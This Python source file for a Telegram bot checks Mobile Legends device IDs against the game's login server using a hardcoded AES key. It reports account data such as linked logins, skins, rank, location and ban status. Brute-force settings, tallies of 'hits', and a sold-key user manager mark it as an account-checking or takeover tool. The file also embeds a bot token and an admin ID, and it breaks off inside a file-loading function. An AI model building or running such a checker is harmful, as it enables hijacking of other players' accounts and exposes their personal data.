from __future__ import annotations
import asyncio
import hashlib
import json
import os
import random
import struct
import sys
import time
import uuid
import zlib
import zipfile
import io
from enum import Enum
from typing import Any, List, Optional, Tuple, Dict
from datetime import datetime, timezone, timedelta
import logging
import string
import re
import importlib.util
import subprocess
import socket
import threading


def _ensure_requirements() -> None:
    if os.environ.get("AUTO_INSTALL_REQUIREMENTS", "1").lower() in {"0", "false", "no"}:
        return
    packages = {
        "zstandard": "zstandard",
        "Crypto": "pycryptodome",
        "telegram": "python-telegram-bot",
    }
    missing = [
        package_name
        for module_name, package_name in packages.items()
        if importlib.util.find_spec(module_name) is None
    ]
    if not missing:
        return
    print(f"Installing missing requirements: {', '.join(missing)}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", *missing])
    except subprocess.CalledProcessError as exc:
        raise RuntimeError(
            "Could not install the required packages. "
            "Run: python -m pip install " + " ".join(missing)
        ) from exc


_ensure_requirements()

import zstandard as zstd
from Crypto.Cipher import AES
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8692114721:AAGjzGb_rL6qWW7fi6vmvr1yYoIsH5nazJg"
ADMIN_IDS = [8477982865]
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
DB_DIR = "database"

os.makedirs(DB_DIR, exist_ok=True)

LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
CLI_VER = os.environ.get('MLBB_CLI_VER', '2.2.16.1232.1')
CHANNEL = os.environ.get('MLBB_CHANNEL', 'and_usa')
LANG = os.environ.get('MLBB_LANG', 'en')
CONN_TO = float(os.environ.get('MLBB_CONN_TO', '3.0'))
READ_TO = float(os.environ.get('MLBB_READ_TO', '5.0'))
_AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
_AES_IV = b'\x00' * 16

MAX_CONCURRENT_BRUTEFORCE = 1
MAX_RETRIES_PER_ACCOUNT = 3
MAX_SINGLE_CHECK_RETRIES = 20
MAX_BAN_CHECK_RETRIES = 20

MIN_VALID_TS = 1451577600  # 2016-01-01

MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla",
    19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia",
    25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin",
    31: "Moskov", 32: "Johnson", 33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora",
    37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley",
    43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead",
    55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi",
    61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale",
    67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz",
    73: "Harith", 74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling",
    85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna",
    91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve",
    102: "Mathilda", 103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus",
    107: "Natan", 108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn", 118: "Joy",
    119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici", 124: "Chip",
    125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

_RANK_DEFINITIONS = [
    (0, 3, "Warrior III"),
    (4, 7, "Warrior II"),
    (8, 11, "Warrior I"),
    (12, 16, "Elite III"),
    (17, 21, "Elite II"),
    (22, 26, "Elite I"),
    (27, 31, "Master IV"),
    (32, 36, "Master III"),
    (37, 41, "Master II"),
    (42, 46, "Master I"),
    (47, 52, "Grandmaster V"),
    (53, 58, "Grandmaster IV"),
    (59, 64, "Grandmaster III"),
    (65, 70, "Grandmaster II"),
    (71, 76, "Grandmaster I"),
    (77, 82, "Epic V"),
    (83, 88, "Epic IV"),
    (89, 94, "Epic III"),
    (95, 100, "Epic II"),
    (101, 106, "Epic I"),
    (107, 112, "Legend V"),
    (113, 118, "Legend IV"),
    (119, 124, "Legend III"),
    (125, 130, "Legend II"),
    (131, 136, "Legend I"),
]

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"), (280000, float("inf"), "World Collector")
]

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
ROMAN = ["V", "IV", "III", "II", "I"]

BANV2_CLIENT_VERSION = '2.2.16.1232.1'
BANV2_CHANNEL = 'and_usa'

BAN_REASONS = {
    "1": "Verbal Abuse / Inappropriate Avatar or Name",
    "2": "Toxic Behavior / In-Game Chat Violation",
    "3": "Intentional Feeding / AFK / Griefing",
    "7": "Illegal Diamond Top-up / Refund Fraud",
    "21": "Using Plug-in Apps to Compromise Competitive Fairness",
    "22": "Account Security Risk / Fraudulent Activity",
    "23": "Unauthorized Account Access",
    "88": "Device Hardware Ban (HWID)",
    "99": "Permanent System Security Violation"
}


def parse_device_id(did: str) -> Tuple[str, str, str, str]:
    """
    Parse device ID into (full, md5, android_id, advertising_id).
    Format: and_<32-char md5><16-char android_id><rest advertising_id>
    """
    raw = did.strip()
    if raw.startswith("and_"):
        body = raw[4:]
    elif raw.startswith("ios_"):
        body = raw[4:]
    else:
        body = raw
    md5 = body[:32] if len(body) >= 32 else body
    aid = body[32:48] if len(body) >= 48 else ""
    adv = body[48:] if len(body) > 48 else ""
    return raw, md5, aid, adv


def hero_name(hid):
    return HERO_ID_MAP.get(hid, f"Hero({hid})")


def safe_int(value, default=0):
    if value is None:
        return default
    if isinstance(value, bool):
        return int(value)
    if isinstance(value, int):
        return value
    if isinstance(value, float):
        return int(value)
    if isinstance(value, str):
        try:
            return int(value.strip())
        except (ValueError, TypeError):
            return default
    if isinstance(value, dict):
        for k in (0, 1, "0", "1"):
            if k in value:
                return safe_int(value[k], default)
    if isinstance(value, list):
        if len(value) == 1:
            return safe_int(value[0], default)
    return default


def unwrap_value(value, max_depth=10):
    current = value
    for _ in range(max_depth):
        if isinstance(current, dict):
            if len(current) == 1:
                only = next(iter(current.values()))
                if isinstance(only, (dict, list)):
                    current = only
                    continue
            return current
        if isinstance(current, list):
            if len(current) == 1:
                current = current[0]
                continue
            return current
        break
    return current


def map_rank(p):
    p = safe_int(p, -1)
    if p < 0:
        return "Unknown"
    for lo, hi, name in _RANK_DEFINITIONS:
        if lo <= p <= hi:
            return name
    if 137 <= p <= 161:
        return f"Mythic {p - 136}"
    if 162 <= p <= 186:
        return f"Mythical Honor {p - 136}"
    if 187 <= p <= 236:
        return f"Mythical Glory {p - 136}"
    if 237 <= p <= 9999:
        return f"Mythical Immortal {p - 136}"
    return "Unknown"


def collector_tier_str(pts):
    try:
        pts = int(pts)
    except Exception:
        return "No Tier"
    if pts < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= pts < hi:
            if hi == float("inf"):
                return name
            idx = min(4, int((pts - lo) // ((hi - lo) / 5)))
            return f"{name} {ROMAN[idx]}"
    return "Unknown"


def collector_base_tier(tier_str):
    if not tier_str or tier_str == "No Tier":
        return "No Tier"
    for _, _, name in COLLECTOR_TIERS:
        if tier_str.startswith(name):
            return name
    return "No Tier"


def fmt_last_login(ts_val):
    if not ts_val:
        return "Never"
    try:
        t = int(ts_val)
        if t <= 0:
            return "Never"
        diff = max(0, int(time.time()) - t)
        d = diff // 86400
        h = (diff % 86400) // 3600
        m = (diff % 3600) // 60
        if d > 0:
            return f"{d}d {h}h ago"
        if h > 0:
            return f"{h}h {m}m ago"
        return f"{m}m ago"
    except Exception:
        return str(ts_val)


def fmt_timestamp_full(timestamp):
    try:
        t = int(timestamp)
        if t <= 0:
            return "N/A"
        dt = datetime.fromtimestamp(t)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(timestamp)


def fmt_age(timestamp):
    try:
        t = int(timestamp)
        if t <= 0 or t < MIN_VALID_TS:
            return "N/A"
        now = int(time.time())
        diff = max(0, now - t)
        days = diff // 86400
        years = days // 365
        rem_days = days % 365
        months = rem_days // 30
        rem_days = rem_days % 30
        parts = []
        if years > 0:
            parts.append(f"{years} year{'s' if years != 1 else ''}")
        if months > 0:
            parts.append(f"{months} month{'s' if months != 1 else ''}")
        if not parts:
            if days > 0:
                parts.append(f"{days} day{'s' if days != 1 else ''}")
            else:
                hours = diff // 3600
                parts.append(f"{hours} hour{'s' if hours != 1 else ''}")
        return ", ".join(parts) + " old"
    except Exception:
        return "N/A"


def get_hero_history(tag_91):
    if not tag_91 or not isinstance(tag_91, list):
        return []
    heroes = []
    seen = set()
    for hid in reversed(tag_91):
        try:
            hid = int(hid)
            if hid not in seen:
                seen.add(hid)
                heroes.append(hero_name(hid))
        except Exception:
            pass
        if len(heroes) >= 10:
            break
    return heroes


def parse_bindings(pd):
    bindings = []
    if pd.get(12, 0):
        bindings.append("Facebook")
    if pd.get(13, 0):
        bindings.append("Google")
    if pd.get(118, 0):
        bindings.append("VK")
    if pd.get(119, 0):
        bindings.append("Apple")
    if pd.get(121, 0):
        bindings.append("Phone")
    if pd.get(122, 0):
        bindings.append("Email")
    if pd.get(123, 0):
        bindings.append("Moonton")
    return ", ".join(bindings) if bindings else "None"


def extract_player_data(result) -> Optional[dict]:
    if not result:
        return None
    try:
        player_list = result.get(0)
        if not player_list:
            return None
        if isinstance(player_list, (dict, SDP)):
            pd = player_list
        elif isinstance(player_list, list):
            if len(player_list) == 0:
                return None
            pd = player_list[0]
        else:
            return None
        if not isinstance(pd, (dict, SDP)):
            return None

        nickname = str(pd.get(2, "") or "").strip() or "Unknown"
        player_id = pd.get(0, "Unknown")
        server_id = pd.get(1, "Unknown")
        level = int(pd.get(3, 0) or 0)
        skin_count = int(pd.get(83, 0) or 0)
        hero_count = int(pd.get(4, 0) or 0)
        achievement_points = int(pd.get(7, 0) or 0)
        rating_score = int(pd.get(9, 0) or 0)
        
        current_rank_raw = pd.get(8)
        high_rank_raw = pd.get(95)
        
        current_rank = map_rank(current_rank_raw)
        high_rank = map_rank(high_rank_raw)

        collector_pts = 0
        collector_rank = 0
        t136 = pd.get(136)
        if isinstance(t136, (dict, SDP)):
            collector_pts = int(t136.get(9, 0) or 0)
            collector_rank = int(t136.get(10, 0) or 0)
        collector_tier = collector_tier_str(collector_pts)

        squad_name = str(pd.get(30, "") or "").replace("`", "").strip()
        squad_icon = str(pd.get(31, "") or "")
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "-"
        squad_id = pd.get(34, pd.get(28, 0))
        squad_id_display = f"Squad ID: {squad_id}" if squad_id else "N/A"

        aff_lv = 0
        t135 = pd.get(135)
        if isinstance(t135, (dict, SDP)):
            aff_lv = int(t135.get(1, 0) or 0)
        affinity = AFFINITY_MAP.get(aff_lv, f"Lv{aff_lv}") if aff_lv else "None"

        wins = int(pd.get(18, 0) or 0)
        losses = int(pd.get(155, 0) or 0)
        total_battles = wins + losses
        win_rate = f"{wins / total_battles * 100:.1f}%" if total_battles > 0 else "N/A"

        t91 = pd.get(91, [])
        hero_history = get_hero_history(t91) if t91 else []
        last_hero = hero_history[0] if hero_history else "N/A"
        prev_heroes = hero_history[1:6] if len(hero_history) > 1 else []

        location_data = pd.get(71, None)
        location = "NOT FOUND"
        if location_data and isinstance(location_data, list) and len(location_data) >= 2:
            location = ", ".join(str(x) for x in location_data)

        last_login_raw = pd.get(5, 0)
        last_login = fmt_last_login(last_login_raw) if last_login_raw else "Never"
        last_login_country = pd.get(87, "Unknown") or "Unknown"
        create_country = pd.get(97, "Unknown") or "Unknown"
        bindings = parse_bindings(pd)
        followers = int(pd.get(15, 0) or 0)
        popularity = int(pd.get(14, 0) or 0)
        likes = int(pd.get(61, 0) or 0)

        credits_score = "N/A"
        t111 = pd.get(111, {})
        if isinstance(t111, (dict, SDP)):
            cs = t111.get(0, 0)
            if cs:
                credits_score = f"{cs}/110"

        latest_skin_id = int(pd.get(175, 0) or 0)
        latest_skin_date = fmt_last_login(pd.get(176, 0)) if pd.get(176, 0) else "N/A"
        sl_expiry = pd.get(50, 0)
        starlight_user = "Yes" if (sl_expiry and isinstance(sl_expiry, int) and sl_expiry > time.time()) else "No"

        t135 = pd.get(135, {})
        if isinstance(t135, (dict, SDP)):
            flags_val = t135.get(0, 0)
        else:
            flags_val = 0
        if flags_val:
            set_bits = bin(int(flags_val)).count('1')
            total_bits = 7
            pct = round((set_bits / total_bits) * 100, 1)
            if pct < 30:
                risk = "Low Risk"
            elif pct < 60:
                risk = "Medium Risk"
            else:
                risk = "High Risk"
            restriction_flags = f"{pct}% ({risk})"
        else:
            restriction_flags = "None"

        mcl_wins = int(pd.get(104, pd.get(103, 0)) or 0)
        creation_ts = pd.get(6, 0)
        if creation_ts and isinstance(creation_ts, int) and creation_ts > 1451577600:
            creation_date = fmt_timestamp_full(creation_ts)
        else:
            creation_date = "N/A"

        return {
            "nickname": nickname, "player_id": player_id, "server_id": server_id,
            "level": level, "skin_count": skin_count, "hero_count": hero_count,
            "achievement_points": achievement_points, "rating_score": rating_score,
            "current_rank": current_rank, "high_rank": high_rank,
            "current_rank_points": current_rank_raw,
            "high_rank_points": high_rank_raw,
            "collector_point": collector_pts, "collector_rank": collector_rank,
            "collector_tier": collector_tier, "squad": squad, "squad_id": squad_id_display,
            "affinity": affinity, "total_battles": total_battles, "wins": wins,
            "win_rate": win_rate, "last_hero": last_hero, "prev_heroes": prev_heroes,
            "hero_history": hero_history, "location": location, "last_login": last_login,
            "last_login_country": last_login_country, "create_country": create_country,
            "bindings": bindings, "followers": followers, "popularity": popularity,
            "likes": likes, "credits_score": credits_score,
            "latest_skin_id": str(latest_skin_id) if latest_skin_id else "N/A",
            "latest_skin_date": latest_skin_date, "starlight_user": starlight_user,
            "restriction_flags": restriction_flags, "mcl_champion_wins": mcl_wins,
            "creation_date": creation_date,
        }
    except Exception as e:
        logger.error(f"extract_player_data error: {e}")
        return None


def format_full_info_text(device_id, result):
    lines = []
    if result.get('status') == 'error':
        lines.append("STATUS: ERROR")
        lines.append(f"DEV ID: {device_id}")
        lines.append(f"ERROR: {result.get('error', 'Unknown error')}")
        return "\n".join(lines)
    if not result.get('player'):
        lines.append("STATUS: NO PLAYER INFO")
        lines.append(f"DEV ID: {device_id}")
        lines.append(f"ACCOUNT ID: {result.get('acc', 'N/A')}")
        lines.append(f"ZONE ID: {result.get('zone', 'N/A')}")
        return "\n".join(lines)
    player_data = result.get('player', {})
    ban_info = result.get('ban_info', {})
    lines.append("=" * 50)
    lines.append("DEV ID INFO:")
    lines.append("=" * 50)
    lines.append("STATUS: REGISTERED")
    lines.append(f"DEVICE ID: {device_id}")
    lines.append(f"ACCOUNT ID: {result.get('acc', 'N/A')}")
    lines.append(f"ZONE ID: {result.get('zone', 'N/A')}")
    lines.append(f"NICKNAME: {player_data.get('nickname', '-')}")
    lines.append(f"LEVEL: {player_data.get('level', '-')}")
    lines.append(f"BINDINGS: {player_data.get('bindings', 'None')}")
    lines.append(f"SKIN COUNT: {player_data.get('skin_count', '-')}")
    lines.append(f"HERO COUNT: {player_data.get('hero_count', '-')}")
    lines.append(f"TOTAL BATTLES: {player_data.get('total_battles', '-')}")
    lines.append(f"WIN RATE: {player_data.get('win_rate', '-')}")
    lines.append(f"RATING SCORE: {player_data.get('rating_score', '-')}")
    lines.append(f"ACHIEVEMENT POINTS: {player_data.get('achievement_points', '-')}")
    lines.append(f"CURRENT RANK: {player_data.get('current_rank', '-')}")
    lines.append(f"HIGHEST RANK: {player_data.get('high_rank', '-')}")
    lines.append(f"CURRENT RANK POINTS: {player_data.get('current_rank_points', '-')}")
    lines.append(f"HIGHEST RANK POINTS: {player_data.get('high_rank_points', '-')}")
    lines.append(f"COLLECTOR TIER: {player_data.get('collector_tier', '-')}")
    lines.append(f"COLLECTOR POINTS: {player_data.get('collector_point', '-')}")
    lines.append(f"COLLECTOR RANK: {player_data.get('collector_rank', '-')}")
    lines.append(f"SQUAD: {player_data.get('squad', '-')}")
    lines.append(f"SQUAD ID: {player_data.get('squad_id', '-')}")
    lines.append(f"AFFINITY: {player_data.get('affinity', '-')}")
    lines.append(f"FOLLOWERS: {player_data.get('followers', '-')}")
    lines.append(f"LIKES: {player_data.get('likes', '-')}")
    lines.append(f"POPULARITY: {player_data.get('popularity', '-')}")
    lines.append(f"LOCATION: {player_data.get('location', '-')}")
    lines.append(f"LAST LOGIN: {player_data.get('last_login', '-')}")
    lines.append(f"LAST LOGIN COUNTRY: {player_data.get('last_login_country', '-')}")
    lines.append(f"CREATE COUNTRY: {player_data.get('create_country', '-')}")
    lines.append(f"CREATION DATE: {player_data.get('creation_date', '-')}")
    lines.append(f"STARLIGHT USER: {player_data.get('starlight_user', '-')}")
    lines.append(f"MCL WINS: {player_data.get('mcl_champion_wins', '-')}")
    lines.append(f"RESTRICTION FLAGS: {player_data.get('restriction_flags', 'None')}")
    lines.append(f"LATEST SKIN ID: {player_data.get('latest_skin_id', '-')}")
    lines.append(f"LATEST SKIN DATE: {player_data.get('latest_skin_date', '-')}")
    lines.append(f"LAST HERO: {player_data.get('last_hero', '-')}")
    if player_data.get('prev_heroes'):
        lines.append(f"RECENT HEROES: {', '.join(player_data['prev_heroes'])}")
    lines.append("")
    ban_status = ban_info.get('status', 'UNKNOWN')
    if ban_status == 'BANNED':
        lines.append("=" * 50)
        lines.append("BAN STATUS: BANNED")
        lines.append(f"BAN CODE: {ban_info.get('ban_code', 'N/A')}")
        lines.append(f"REASON: {ban_info.get('reason', 'Unknown')}")
        lines.append(f"DURATION: {ban_info.get('duration', 'Unknown')}")
    elif ban_status == 'NOT BANNED':
        lines.append("=" * 50)
        lines.append("BAN STATUS: CLEAN")
    else:
        lines.append("=" * 50)
        lines.append("BAN STATUS: UNKNOWN")
    lines.append("=" * 50)
    return "\n".join(lines)


def format_result_line(res: dict) -> str:
    acc = res['acc']
    zone = res['zone']
    did = res['did']
    player = res.get('player')
    ban_info = res.get('ban_info', {})
    ban_status = ban_info.get('status', 'UNKNOWN')
    retries = res.get('retries_used', 0)
    if ban_status == 'BANNED':
        ban_str = f"BANNED ({ban_info.get('ban_code', 'N/A')}: {ban_info.get('reason', 'Unknown')})"
    elif ban_status == 'NOT BANNED':
        ban_str = "CLEAN"
    else:
        ban_str = "UNKNOWN"

    prev = ", ".join(player.get("prev_heroes", [])) if player.get("prev_heroes") else "N/A"
    line = (
        f"Account: {acc} | Zone: {zone} | "
        f"Name: {player.get('nickname', '?')} | "
        f"Level: {player.get('level', '?')} | "
        f"Rank: {player.get('current_rank', '?')} | "
        f"Highest Rank: {player.get('high_rank', '?')} | "
        f"Skins: {player.get('skin_count', '?')} | "
        f"Heroes: {player.get('hero_count', '?')} | "
        f"Battles: {player.get('total_battles', '?')} | "
        f"WR: {player.get('win_rate', '?')} | "
        f"Last Hero: {player.get('last_hero', '?')} | "
        f"Prev: {prev} | "
        f"Squad: {player.get('squad', '?')} | "
        f"Collector: {player.get('collector_tier', '?')} | "
        f"Affinity: {player.get('affinity', '?')} | "
        f"Bindings: {player.get('bindings', 'None')} | "
        f"Starlight: {player.get('starlight_user', '?')} | "
        f"Last Login: {player.get('last_login', '?')} | "
        f"Country: {player.get('last_login_country', '?')} | "
        f"Reg: {player.get('create_country', '?')} | "
        f"Ban: {ban_str} | "
        f"DevID: {did}"
    )
    return line


def format_single_check_result(result: dict) -> str:
    retries = result.get('retries_used', 1)
    
    if result.get('status') == 'error':
        return (
            f"ERROR\n"
            f"======\n\n"
            f"Device: {result.get('device_id', 'N/A')[:50]}...\n"
            f"Error: {result.get('error', 'Unknown error')}\n"
            f"Retries: {retries}"
        )
    
    device_id = result.get('device_id', 'N/A')
    device_short = device_id[:40] + "..." if len(device_id) > 40 else device_id
    
    if not result.get('player_found', False) or result.get('status') == 'unregistered':
        return (
            f"UNREGISTERED ACCOUNT\n"
            f"====================\n\n"
            f"Device: {device_short}\n"
            f"Account ID: {result.get('account_id', 'N/A')}\n"
            f"Zone ID: {result.get('zone_id', 'N/A')}\n\n"
            f"This device ID is NOT linked to any MLBB account.\n"
            f"Player information could not be found.\n\n"
            f"Status: Unregistered / Player Not Found\n"
            f"Retries: {retries}"
        )
    
    elif result.get('status') == 'registered':
        player_data = result.get('player_data', {})
        ban_info = result.get('ban_info', {})
        
        if player_data:
            nickname = player_data.get('nickname', '—')
            level = player_data.get('level', '—')
            skin_count = player_data.get('skin_count', '—')
            current_rank = player_data.get('current_rank', '—')
            high_rank = player_data.get('high_rank', '—')
            win_rate = player_data.get('win_rate', '—')
            total_battles = player_data.get('total_battles', '—')
            collector_tier = player_data.get('collector_tier', '—')
            bindings = player_data.get('bindings', 'None')
            
            ban_status = ban_info.get('status', 'UNKNOWN')
            if ban_status == "NOT BANNED":
                ban_display = "CLEAN"
            elif ban_status == "BANNED":
                ban_display = f"BANNED ({ban_info.get('ban_code', 'N/A')}: {ban_info.get('reason', 'Unknown')})"
            else:
                ban_display = "UNKNOWN"
            
            return (
                f"REGISTERED ACCOUNT\n"
                f"==================\n\n"
                f"Device: {device_short}\n\n"
                f"Player Info:\n"
                f"Nickname: {nickname}\n"
                f"Level: {level}\n"
                f"Skins: {skin_count}\n"
                f"Current Rank: {current_rank}\n"
                f"Highest Rank: {high_rank}\n"
                f"Win Rate: {win_rate}\n"
                f"Matches: {total_battles}\n"
                f"Collector Tier: {collector_tier}\n"
                f"Bindings: {bindings}\n\n"
                f"Ban Status: {ban_display}\n\n"
                f"Full details sent as file above\n"
                f"Retries: {retries}"
            )
        else:
            return (
                f"REGISTERED ACCOUNT\n"
                f"==================\n\n"
                f"Device: {device_short}\n\n"
                f"Account ID: {result.get('account_id', 'N/A')}\n"
                f"Zone ID: {result.get('zone_id', 'N/A')}\n\n"
                f"Full details sent as file above\n"
                f"Retries: {retries}"
            )
    
    return "Unknown status"


def format_ban_check_result(result: dict) -> str:
    retries = result.get('retries_used', 1)
    
    if result.get('status') == 'error':
        return (
            f"BAN CHECK ERROR\n"
            f"===============\n\n"
            f"Device: {result.get('device_id', 'N/A')[:50]}...\n"
            f"Error: {result.get('error', 'Unknown error')}\n"
            f"Retries: {retries}"
        )
    
    device_id = result.get('device_id', 'N/A')
    device_short = device_id[:40] + "..." if len(device_id) > 40 else device_id
    status = result.get('status', 'UNKNOWN')
    acc = result.get('account_id', 'N/A')
    zone = result.get('zone_id', 'N/A')
    
    if status == 'BANNED':
        ban_code = result.get('ban_code', 'N/A')
        reason = result.get('reason', 'N/A')
        duration = result.get('duration', 'N/A')
        return (
            f"BAN CHECK RESULT\n"
            f"================\n\n"
            f"Device: {device_short}\n"
            f"Account: {acc}\n"
            f"Zone: {zone}\n\n"
            f"Ban Status: BANNED\n"
            f"Ban Code: {ban_code}\n"
            f"Reason: {reason}\n"
            f"Duration: {duration}\n"
            f"Retries: {retries}"
        )
    elif status == 'NOT BANNED':
        return (
            f"BAN CHECK RESULT\n"
            f"================\n\n"
            f"Device: {device_short}\n"
            f"Account: {acc}\n"
            f"Zone: {zone}\n\n"
            f"Ban Status: CLEAN / NOT BANNED\n"
            f"Retries: {retries}"
        )
    else:
        return (
            f"BAN CHECK RESULT\n"
            f"================\n\n"
            f"Device: {device_short}\n"
            f"Account: {acc}\n"
            f"Zone: {zone}\n\n"
            f"Ban Status: UNKNOWN\n"
            f"Note: {result.get('error', 'Could not determine ban status')}\n"
            f"Retries: {retries}"
        )


def format_creation_date_result(result: dict) -> str:
    if not result:
        return (
            f"CREATION DATE CHECK\n"
            f"===================\n\n"
            f"Login failed! Device ID invalid or dead."
        )
    
    device_id = result.get('did', 'N/A')
    device_short = device_id[:40] + "..." if len(device_id) > 40 else device_id
    acc = result.get('acc', 'N/A')
    zone = result.get('zone', 'N/A')
    ts = result.get('creation_ts', 0)
    
    if ts and ts >= MIN_VALID_TS:
        date_str = fmt_timestamp_full(ts)
        age_str = fmt_age(ts)
        age_days = max(0, int(time.time()) - ts) // 86400
        if age_days >= 365 * 3:
            cat_text = "OLD ACCOUNT (3+ years)"
        elif age_days >= 365:
            cat_text = "ESTABLISHED (1-3 years)"
        elif age_days >= 90:
            cat_text = "MODERATE (3-12 months)"
        else:
            cat_text = "RECENT (less than 3 months)"
    else:
        date_str = "N/A"
        age_str = "N/A"
        age_days = 0
        cat_text = "UNKNOWN"
    
    return (
        f"CREATION DATE RESULT\n"
        f"====================\n\n"
        f"Device: {device_short}\n"
        f"Account: {acc}\n"
        f"Zone: {zone}\n\n"
        f"Created: {date_str}\n"
        f"Age: {age_str}\n"
        f"Age (days): {age_days:,}\n"
        f"Category: {cat_text}"
    )


class LiveStats:
    def __init__(self):
        self.lvl_1_30 = 0
        self.lvl_31_50 = 0
        self.lvl_51_99 = 0
        self.lvl_100p = 0
        self.skin_1_50 = 0
        self.skin_51_99 = 0
        self.skin_100_250 = 0
        self.skin_251_300 = 0
        self.skin_301_400 = 0
        self.skin_400p = 0
        self.rank_warrior = 0
        self.rank_elite = 0
        self.rank_master = 0
        self.rank_gm = 0
        self.rank_epic = 0
        self.rank_legend = 0
        self.rank_mythic = 0
        self.total_hits = 0
        self.unreg = 0
        self.with_info = 0
        self.no_info = 0
        self.banned = 0
        self.clean = 0
        self.total_retries = 0

    def add_hit(self, res: dict):
        self.total_hits += 1
        self.total_retries += res.get('retries_used', 0)
        player = res.get('player')
        ban_info = res.get('ban_info', {})
        if ban_info.get('status') == 'BANNED':
            self.banned += 1
        elif ban_info.get('status') == 'NOT BANNED':
            self.clean += 1
        if not player:
            self.no_info += 1
            return
        self.with_info += 1
        level = player.get('level', 0) or 0
        skin = player.get('skin_count', 0) or 0
        rank = player.get('current_rank', '') or ''
        if level <= 30:
            self.lvl_1_30 += 1
        elif level <= 50:
            self.lvl_31_50 += 1
        elif level <= 99:
            self.lvl_51_99 += 1
        else:
            self.lvl_100p += 1
        if skin <= 50:
            self.skin_1_50 += 1
        elif skin <= 99:
            self.skin_51_99 += 1
        elif skin <= 250:
            self.skin_100_250 += 1
        elif skin <= 300:
            self.skin_251_300 += 1
        elif skin <= 400:
            self.skin_301_400 += 1
        else:
            self.skin_400p += 1
        rank_lower = rank.lower()
        if 'warrior' in rank_lower:
            self.rank_warrior += 1
        elif 'elite' in rank_lower:
            self.rank_elite += 1
        elif 'master' in rank_lower:
            self.rank_master += 1
        elif 'grandmaster' in rank_lower:
            self.rank_gm += 1
        elif 'epic' in rank_lower:
            self.rank_epic += 1
        elif 'legend' in rank_lower:
            self.rank_legend += 1
        elif 'mythic' in rank_lower or 'mythical' in rank_lower:
            self.rank_mythic += 1

    def add_unreg(self):
        self.unreg += 1

    def format(self) -> str:
        avg_retries = (self.total_retries / self.total_hits) if self.total_hits > 0 else 0
        return (
            f"Live Stats\n"
            f"==========\n\n"
            f"Level\n"
            f"  1-30: {self.lvl_1_30:,} | 31-50: {self.lvl_31_50:,}\n"
            f"  51-99: {self.lvl_51_99:,} | 100+: {self.lvl_100p:,}\n\n"
            f"Skin\n"
            f"  1-50: {self.skin_1_50:,} | 51-99: {self.skin_51_99:,}\n"
            f"  100-250: {self.skin_100_250:,} | 251-300: {self.skin_251_300:,}\n"
            f"  301-400: {self.skin_301_400:,} | 400+: {self.skin_400p:,}\n\n"
            f"Rank\n"
            f"  Warrior: {self.rank_warrior:,} | Elite: {self.rank_elite:,}\n"
            f"  Master: {self.rank_master:,} | GM: {self.rank_gm:,}\n"
            f"  Epic: {self.rank_epic:,} | Legend: {self.rank_legend:,}\n"
            f"  Mythic+: {self.rank_mythic:,}\n\n"
            f"Ban Status\n"
            f"  Banned: {self.banned:,} | Clean: {self.clean:,}\n\n"
            f"Retries\n"
            f"  Reg: {self.total_hits:,} | Unreg: {self.unreg:,}"
        )


class KeyManager:
    def __init__(self):
        self.keys = self._load(KEYS_FILE)
        self.users = self._load(USERS_FILE)

    def _load(self, path: str) -> dict:
        try:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return json.load(f)
